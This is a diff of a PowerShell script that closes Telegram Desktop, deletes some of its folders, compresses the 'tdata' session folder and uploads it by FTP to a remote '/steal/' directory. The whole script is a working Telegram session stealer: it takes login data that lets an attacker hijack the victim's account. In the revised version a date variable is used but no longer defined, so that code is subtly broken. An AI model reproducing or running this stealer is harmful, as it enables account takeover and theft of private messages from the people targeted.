@@ -1,78 +1,61 @@
+# Stop and remove Telegram process
 $processName = "telegram"
 
-try{
-
-if (Get-Process $processName -ErrorAction SilentlyContinue) {
-    Get-Process -Name $processName  | Stop-Process
-} else {
-   # Write-Host "$processName is not running."
+try {
+    if (Get-Process $processName -ErrorAction SilentlyContinue) {
+        Get-Process -Name $processName | Stop-Process
+    }
+} catch {
+    # Write-Host "Something went wrong..."
 }
 
-
-
-#Write-Host "Telegram Application Closed..."
-
-}
-catch{
-
-#Write-Host "something went wrong..."
-
-}
+# Remove Telegram data folders
 $userName = $env:USERNAME
-$folderPath1  = "C:\Users\$userName\AppData\Roaming\Telegram Desktop\tdata\user_data"
-$folderPath2  = "C:\Users\$userName\AppData\Roaming\Telegram Desktop\tdata\emoji"
+$userDataPath = "C:\Users\$userName\AppData\Roaming\Telegram Desktop\tdata\user_data"
+$emojiPath = "C:\Users\$userName\AppData\Roaming\Telegram Desktop\tdata\emoji"
 
-try{
-Remove-Item $folderPath1 -Recurse -Force  -ErrorAction SilentlyContinue
-#Write-Host "Removed user_data"
-Remove-Item $folderPath2 -Recurse -Force  -ErrorAction SilentlyContinue
-#Write-Host "Removed emoji"
-
+try {
+    Remove-Item $userDataPath -Recurse -Force -ErrorAction SilentlyContinue
+    Remove-Item $emojiPath -Recurse -Force -ErrorAction SilentlyContinue
+} catch {
+    # Write-Host "Something went wrong..."
 }
 
-catch{
+# Compress Telegram data folder
+$sourceFolder = "C:\Users\$userName\AppData\Roaming\Telegram Desktop\tdata"
+$zipFile = "C:\Users\$userName\AppData\Roaming\Telegram Desktop\tdata.zip"
+$maxSize = 50 * 1MB # Convert to bytes
 
+if (Test-Path $zipFile) {
+    Remove-Item $zipFile
 }
-$source_folder = "C:\Users\$userName\AppData\Roaming\Telegram Desktop\tdata"
-$zip_file = "C:\Users\$userName\AppData\Roaming\Telegram Desktop\tdata.zip"
-$max_size = 50 * 1MB # Convert to bytes
-
-
-if (Test-Path $zip_file) {
-    Remove-Item $zip_file
-}
-
-#Write-Host "Compressing files in $source_folder to $zip_file..."
 
 Add-Type -AssemblyName System.IO.Compression.FileSystem
-[System.IO.Compression.ZipFile]::CreateFromDirectory($source_folder, $zip_file, "Optimal", $false)
+[System.IO.Compression.ZipFile]::CreateFromDirectory($sourceFolder, $zipFile, "Optimal", $false)
 
-
-Get-ChildItem $zip_file | Where-Object { $_.Length -gt $max_size } | ForEach-Object {
+Get-ChildItem $zipFile | Where-Object { $_.Length -gt $maxSize } | ForEach-Object {
     Write-Host "Removing $($_.FullName)..."
     Remove-Item $_.FullName
 }
 
-$userName = $env:USERNAME
-$filePath = "C:\Users\$userName\AppData\Roaming\Telegram Desktop\tdata.zip"
-$dateString = Get-Date -Format "yyyyMMdd_HHmmss"
-## FTP server settings
+# Upload compressed data to FTP server
+
 $ftpServer = "your_ftp_server"
-$ftpUsername = "xxxxx"
-$ftpPassword = "yyyyy"
-
-# Local file to upload
-$localFilePath = "C:\Users\$userName\AppData\Roaming\Telegram Desktop\tdata.zip"
-
-# Remote FTP file path
+$ftpUsername = "xxxx"
+$ftpPassword = "yyyy"
+$localFilePath = $zipFile
 $remoteFilePath = "/steal/$dateString.zip"
 
-# Create FTP session
-$ftpSession = New-Object -TypeName System.Net.WebClient
-$ftpSession.Credentials = New-Object System.Net.NetworkCredential($ftpUsername, $ftpPassword)
+$ftpRequest = [System.Net.FtpWebRequest]::Create("$ftpServer/$remoteFilePath")
+$ftpRequest.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
+$ftpRequest.Credentials = New-Object System.Net.NetworkCredential($ftpUsername, $ftpPassword)
 
-# Upload file
-$ftpSession.UploadFile("ftp://$ftpServer/$remoteFilePath", $localFilePath)
+# read the file from local machine
+$fileContents = [System.IO.File]::ReadAllBytes($localFilePath)
 
-# Close FTP session
-$ftpSession.Dispose()
+# upload the file to the remote server
+$requestStream = $ftpRequest.GetRequestStream()
+$requestStream.Write($fileContents, 0, $fileContents.Length)
+$requestStream.Close()
+
+
